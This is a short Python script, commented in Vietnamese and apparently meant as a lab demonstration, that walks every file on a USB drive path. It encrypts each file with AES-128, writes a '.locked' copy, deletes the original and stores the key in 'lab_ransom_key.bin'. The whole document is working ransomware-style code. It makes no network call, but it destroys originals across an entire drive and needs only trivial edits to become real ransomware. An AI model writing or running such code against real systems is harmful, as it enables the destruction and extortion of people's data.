import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

USB_PATH = "F:/"  # đổi theo USB của bạn
KEY = get_random_bytes(16)  # AES-128 key
BLOCK_SIZE = 16

def pad(data):
    padding_len = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data + bytes([padding_len]) * padding_len

def encrypt_file(filepath):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        cipher = AES.new(KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data))
        encrypted_path = filepath + ".locked"
        with open(encrypted_path, "wb") as f:
            f.write(cipher.iv + ct_bytes)
        os.remove(filepath)  # xóa file gốc
        print(f"[+] {filepath} -> {encrypted_path}")
    except Exception as e:
        print(f"[!] Lỗi {filepath}: {e}")

# --------- Quét toàn USB ---------
for root, dirs, files in os.walk(USB_PATH):
    for file in files:
        fullpath = os.path.join(root, file)
        encrypt_file(fullpath)

# --------- Key lưu lại để giải mã ---------
with open(os.path.join(USB_PATH, "lab_ransom_key.bin"), "wb") as f:
    f.write(KEY)
print("[i] Key đã lưu: lab_ransom_key.bin")